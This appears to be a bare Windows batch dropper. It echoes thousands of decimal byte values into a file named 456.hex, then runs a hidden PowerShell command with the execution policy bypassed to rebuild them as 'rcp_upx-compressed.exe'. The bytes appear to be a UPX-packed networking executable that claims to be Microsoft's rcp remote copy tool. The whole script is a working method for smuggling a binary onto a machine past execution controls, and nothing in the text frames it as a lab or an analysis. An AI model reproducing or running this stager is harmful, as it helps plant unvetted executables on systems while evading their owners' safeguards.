echo|set /p=105 70 130 236 194 139 100 95 113 29 194 32 91 99 155 52 162 51 10 24 115 103 83 96 246 168 119 235 69 203 25 197 74 58 16 143 48 27 25 75 160 33 217 143 187 138 40 50 162 20 46 255 155 238 208 10 8 1 76 111 99 97 108 70 114 101 101 83 108 191 253 70 208 5 195 71 101 116 70 105 10 65 116 116 114 105 182 253 143 253 98 117 116 101 115 65 19 76 97 115 116 69 114 114 111 114 13 70 4 183 159 125 251 109 97 116 77 25 115 97 103 101 29 77 111 100 117 51 >>456.hex
echo|set /p=72 97 207 126 235 220 110 100 57 33 105 8 67 108 111 115 101 10 78 101 131 221 102 179 120 83 14 3 114 115 15 0 251 246 5 137 221 100 68 85 47 114 78 97 109 22 109 183 159 230 234 96 95 95 112 2 102 109 94 101 246 247 246 237 11 32 116 95 97 112 17 116 121 112 15 99 111 110 164 45 88 55 251 111 108 102 112 39 15 109 41 112 190 59 182 181 99 203 43 104 144 114 51 17 97 100 106 117 115 251 182 96 95 102 100 105 118 73 14 101 199 104 5 124 174 109 93 211 >>456.hex
echo|set /p=95 151 105 241 16 28 103 251 189 111 173 24 16 97 114 103 115 14 26 101 110 54 220 187 107 219 84 120 10 7 88 99 112 192 47 205 77 118 246 107 19 99 8 104 132 7 219 90 115 219 115 121 110 101 78 5 95 18 114 8 111 123 254 220 7 48 115 116 97 111 195 110 62 190 191 246 110 30 110 111 21 47 11 108 105 115 28 102 173 240 132 193 36 99 69 115 112 140 235 54 152 107 187 102 16 109 107 193 68 107 119 22 183 174 21 222 116 239 192 223 6 108 43 101 107 190 237 52 >>456.hex
echo|set /p=11 61 245 48 112 109 137 95 123 34 136 208 105 185 247 60 24 109 248 246 246 67 104 220 84 111 79 159 66 117 102 102 150 73 115 179 188 189 253 17 65 108 112 5 78 117 109 45 105 99 65 12 101 89 182 77 72 255 115 2 3 16 21 116 83 193 132 19 175 232 76 1 3 82 5 225 5 44 194 46 221 111 178 253 15 1 11 1 7 127 32 0 53 38 4 16 51 219 216 100 15 1 11 2 10 5 3 148 157 59 236 4 60 112 3 12 151 94 246 222 51 80 106 12 43 4 7 208 >>456.hex
echo|set /p=72 144 108 6 40 42 66 232 15 112 20 245 0 200 44 169 6 64 168 187 240 52 28 200 64 28 200 6 235 147 148 100 220 39 46 116 216 23 236 115 203 206 30 144 235 4 35 14 90 184 91 18 96 46 100 190 97 44 22 146 110 176 5 251 2 115 36 2 55 216 66 233 192 46 10 164 0 195 64 96 247 105 74 186 39 38 64 13 164 43 13 0 0 0 248 65 98 0 0 0 36 0 0 255 0 0 0 0 0 0 0 0 96 190 0 112 0 1 141 190 0 160 255 255 87 131 205 255 >>456.hex
echo|set /p=235 16 144 144 144 144 144 144 138 6 70 136 7 71 1 219 117 7 139 30 131 238 252 17 219 114 237 184 1 0 0 0 1 219 117 7 139 30 131 238 252 17 219 17 192 1 219 115 239 117 9 139 30 131 238 252 17 219 115 228 49 201 131 232 3 114 13 193 224 8 138 6 70 131 240 255 116 116 137 197 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 117 7 139 30 131 238 252 17 219 17 201 117 32 65 1 219 117 7 139 30 131 238 252 17 219 17 201 1 219 115 239 117 9 >>456.hex
echo|set /p=139 30 131 238 252 17 219 115 228 131 193 2 129 253 0 243 255 255 131 209 1 141 20 47 131 253 252 118 15 138 2 66 136 7 71 73 117 247 233 99 255 255 255 144 139 2 131 194 4 137 7 131 199 4 131 233 4 119 241 1 207 233 76 255 255 255 94 137 247 185 128 0 0 0 138 7 71 44 232 60 1 119 247 128 63 1 117 242 139 7 138 95 4 102 193 232 8 193 192 16 134 196 41 248 128 235 232 1 240 137 7 131 199 5 136 216 226 217 141 190 0 96 0 0 139 7 9 192 >>456.hex
echo|set /p=116 69 139 95 4 141 132 48 68 132 0 0 1 243 80 131 199 8 255 150 208 132 0 0 149 138 7 71 8 192 116 220 137 249 121 7 15 183 7 71 80 71 185 87 72 242 174 85 255 150 212 132 0 0 9 192 116 7 137 3 131 195 4 235 216 255 150 228 132 0 0 139 174 216 132 0 0 141 190 0 240 255 255 187 0 16 0 0 80 84 106 4 83 87 255 213 141 135 239 1 0 0 128 32 127 128 96 40 127 88 80 84 80 83 87 255 213 88 97 141 68 36 128 106 0 57 196 117 >>456.hex
echo|set /p=250 131 236 128 233 172 154 255 255 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 4 0 0 0 0 0 2 0 11 0 0 0 32 0 0 128 16 0 0 0 96 0 0 128 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 1 0 0 0 56 0 0 128 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 12 4 0 0 80 0 0 0 160 64 0 0 136 40 0 0 228 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 4 0 0 0 0 0 1 0 1 0 0 0 120 0 0 128 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=4 0 0 0 0 0 1 0 12 4 0 0 144 0 0 0 164 144 0 0 160 3 0 0 228 4 0 0 0 0 0 0 40 105 0 0 156 3 52 0 0 0 86 0 83 0 95 0 86 0 69 0 82 0 83 0 73 0 79 0 78 0 95 0 73 0 78 0 70 0 79 0 0 0 0 0 189 4 239 254 0 0 1 0 1 0 5 0 0 0 40 10 1 0 5 0 0 0 40 10 63 0 0 0 0 0 0 0 4 0 4 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=252 2 0 0 1 0 83 0 116 0 114 0 105 0 110 0 103 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 216 2 0 0 1 0 48 0 52 0 48 0 67 0 48 0 52 0 66 0 48 0 0 0 76 0 22 0 1 0 67 0 111 0 109 0 112 0 97 0 110 0 121 0 78 0 97 0 109 0 101 0 0 0 0 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 >>456.hex
echo|set /p=105 0 111 0 110 0 0 0 112 0 36 0 1 0 70 0 105 0 108 0 101 0 68 0 101 0 115 0 99 0 114 0 105 0 112 0 116 0 105 0 111 0 110 0 0 0 0 0 67 0 111 0 109 0 109 0 97 0 110 0 100 0 101 0 32 0 100 0 101 0 32 0 99 0 111 0 112 0 105 0 101 0 32 0 224 0 32 0 100 0 105 0 115 0 116 0 97 0 110 0 99 0 101 0 32 0 84 0 67 0 80 0 47 0 73 0 80 0 0 0 100 0 34 0 1 0 70 0 >>456.hex
echo|set /p=105 0 108 0 101 0 86 0 101 0 114 0 115 0 105 0 111 0 110 0 0 0 0 0 53 0 46 0 49 0 46 0 50 0 54 0 48 0 48 0 46 0 48 0 32 0 40 0 120 0 112 0 99 0 108 0 105 0 101 0 110 0 116 0 46 0 48 0 49 0 48 0 56 0 49 0 55 0 45 0 49 0 49 0 52 0 56 0 41 0 0 0 48 0 8 0 1 0 73 0 110 0 116 0 101 0 114 0 110 0 97 0 108 0 78 0 97 0 109 0 101 0 0 0 114 0 99 0 >>456.hex
echo|set /p=112 0 46 0 101 0 120 0 101 0 0 0 130 0 47 0 1 0 76 0 101 0 103 0 97 0 108 0 67 0 111 0 112 0 121 0 114 0 105 0 103 0 104 0 116 0 0 0 169 0 32 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 32 0 67 0 111 0 114 0 112 0 111 0 114 0 97 0 116 0 105 0 111 0 110 0 46 0 32 0 84 0 111 0 117 0 115 0 32 0 100 0 114 0 111 0 105 0 116 0 115 0 32 0 114 0 233 0 115 0 >>456.hex
echo|set /p=101 0 114 0 118 0 233 0 115 0 46 0 0 0 0 0 56 0 8 0 1 0 79 0 114 0 105 0 103 0 105 0 110 0 97 0 108 0 70 0 105 0 108 0 101 0 110 0 97 0 109 0 101 0 0 0 114 0 99 0 112 0 46 0 101 0 120 0 101 0 0 0 120 0 43 0 1 0 80 0 114 0 111 0 100 0 117 0 99 0 116 0 78 0 97 0 109 0 101 0 0 0 0 0 83 0 121 0 115 0 116 0 232 0 109 0 101 0 32 0 100 0 39 0 101 0 120 0 >>456.hex
echo|set /p=112 0 108 0 111 0 105 0 116 0 97 0 116 0 105 0 111 0 110 0 32 0 77 0 105 0 99 0 114 0 111 0 115 0 111 0 102 0 116 0 174 0 32 0 87 0 105 0 110 0 100 0 111 0 119 0 115 0 174 0 0 0 0 0 59 0 11 0 1 0 80 0 114 0 111 0 100 0 117 0 99 0 116 0 86 0 101 0 114 0 115 0 105 0 111 0 110 0 0 0 53 0 46 0 49 0 46 0 50 0 54 0 48 0 48 0 46 0 48 0 0 0 0 0 68 0 0 0 >>456.hex
echo|set /p=1 0 86 0 97 0 114 0 70 0 105 0 108 0 101 0 73 0 110 0 102 0 111 0 0 0 0 0 36 0 4 0 0 0 84 0 114 0 97 0 110 0 115 0 108 0 97 0 116 0 105 0 111 0 110 0 0 0 0 0 12 4 176 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 20 149 0 0 208 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 33 149 0 0 236 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 149 0 0 244 148 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 57 149 0 0 252 148 0 0 0 0 0 0 0 0 0 0 0 0 0 0 69 149 0 0 4 149 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 149 0 0 12 149 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 90 149 0 0 104 149 0 0 120 149 0 0 136 149 0 0 150 149 0 0 164 149 0 0 0 0 0 0 178 149 0 0 0 0 0 0 192 149 0 0 0 0 0 0 198 149 0 0 >>456.hex
echo|set /p=0 0 0 0 204 149 0 0 0 0 0 0 19 0 0 128 0 0 0 0 75 69 82 78 69 76 51 50 46 68 76 76 0 65 68 86 65 80 73 51 50 46 100 108 108 0 109 115 118 99 114 116 46 100 108 108 0 77 83 87 83 79 67 75 46 100 108 108 0 85 83 69 82 51 50 46 100 108 108 0 87 83 50 95 51 50 46 100 108 108 0 0 76 111 97 100 76 105 98 114 97 114 121 65 0 0 71 101 116 80 114 111 99 65 100 100 114 101 115 115 0 0 86 105 114 116 117 97 >>456.hex
echo|set /p=108 80 114 111 116 101 99 116 0 0 86 105 114 116 117 97 108 65 108 108 111 99 0 0 86 105 114 116 117 97 108 70 114 101 101 0 0 0 69 120 105 116 80 114 111 99 101 115 115 0 0 0 71 101 116 85 115 101 114 78 97 109 101 65 0 0 101 120 105 116 0 0 114 99 109 100 0 0 67 104 97 114 84 111 79 101 109 66 117 102 102 65 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=>>456.hex
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command "[string]$hex = get-content -path 456.hex;[Byte[]] $temp = $hex -split ' ';[System.IO.File]::WriteAllBytes('rcp_upx-compressed.exe', $temp)"
